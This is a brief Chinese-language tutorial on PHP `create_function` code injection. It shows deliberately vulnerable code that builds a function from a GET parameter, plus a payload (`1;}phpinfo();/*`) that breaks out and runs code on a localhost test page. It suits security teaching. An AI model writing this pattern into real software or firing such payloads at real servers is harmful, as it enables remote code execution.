## create_function 函数

`create_function` 函数根据传递的参数创建匿名函数，并为该匿名函数返回唯⼀的名称
函数语法: `string create_function(string $arges , string $code)`

```php
<?php
$id=$_GET['id'];
$code='echo'.$func.'test'.$id.'.';
create_function('$func',$code);
?>
```

`create_function` 函数会创建虚拟函数转变成如下代码

```php
<?php
$id=$_GET['id'];
function func($func){
    echo "test".$id;
}
```

当 id 传⼊`1;}phpinfo();/*`时 就可以造成代码执⾏
Payload:

`http://127.0.0.1/test.php?id=1;}phpinfo();/*`

拼接后为, 把后面都注释了。

```php
<?php
$id=$_GET['id'];
function func($func){
  echo "test".1;}phpinfo();/*;
}
?>
```
